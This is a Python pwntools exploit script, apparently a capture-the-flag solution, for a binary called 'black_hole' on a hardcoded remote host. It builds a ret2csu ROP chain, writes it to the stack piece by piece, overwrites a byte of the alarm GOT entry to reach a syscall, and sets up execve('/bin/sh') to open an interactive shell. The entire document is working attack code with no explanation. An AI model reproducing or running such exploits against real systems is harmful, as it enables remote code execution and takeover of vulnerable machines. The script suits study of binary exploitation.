from pwn import *

context.log_level = 'debug'
context.arch='amd64'

LOCAL = False

if LOCAL:
	p = process('black_hole')
else:
	#p = remote('127.0.0.1',10001)
	p = remote("106.75.66.195",11003)

main_addr = 0x0000000000400704
token = 2333

def write_stack(data):
	p.sendline(str(token))
	sleep(1)
	payload = data.rjust(0x18,'A') + p64(main_addr)
	sleep(1)
	p.send(payload)

gadget_1 = 0x00000000004007A6
gadget_2 = 0x0000000000400790
 
addr_got_read = 0x0000000000601028
addr_bss = 0x000000000601058
addr_got_alarm = 0x0000000000601020


def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0,Flag=True):
	if Flag:
	    pl = p64(part1)   # part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret
	    pl += p64(0)       # for junk
	    pl += p64(0x0)     # rbx be 0x0
	    pl += p64(0x1)     # rbp be 0x1
	    pl += p64(jmp2)    # r12 jump to
	    pl += p64(arg3)    # r13 -> rdx    arg3
	    pl += p64(arg2)    # r14 -> rsi    arg2
	    pl += p64(arg1)    # r15 -> edi    arg1
	    pl += p64(part2)   # part2 entry will call [rbx + r12 + 0x8]
	    return pl
	else:
	    pl 	= p64(0)       # for junk
	    pl += p64(0x0)     # rbx be 0x0
	    pl += p64(0x1)     # rbp be 0x1
	    pl += p64(jmp2)    # r12 jump to
	    pl += p64(arg3)    # r13 -> rdx    arg3
	    pl += p64(arg2)    # r14 -> rsi    arg2
	    pl += p64(arg1)    # r15 -> edi    arg1
	    pl += p64(part2)   # part2 entry will call [rbx + r12 + 0x8]
	    return pl

payload =  com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_got_alarm,arg3=1)
payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=0x0,arg2=addr_bss,arg3=0x3B,Flag=False)
payload += com_gadget(gadget_1,gadget_2,addr_bss+8,arg1=addr_bss,arg2=0x0,arg3=0x0,Flag=False)

def main():
	print payload
	for i in xrange(len(payload), 0, -8):
	    print i
	    write_stack(payload[i-8:i])
	
	sleep(1)
	raw_input('0x00000000004006F5 ')
	p.sendline(str(token))
	p.send("A"*0x18 + p64(0x00000000004006CB))
	sleep(1)
	off = 5
	p.send(str(off))  # ovwer write one byte
	sleep(1)

	payload2 = "/bin/sh\x00"
	payload2 += p64(0x0000000000400540)
	payload2 += (0x3B - len(payload2) - 1) * "A"
	p.sendline(payload2)
	p.interactive()

if __name__ == '__main__':
	main()
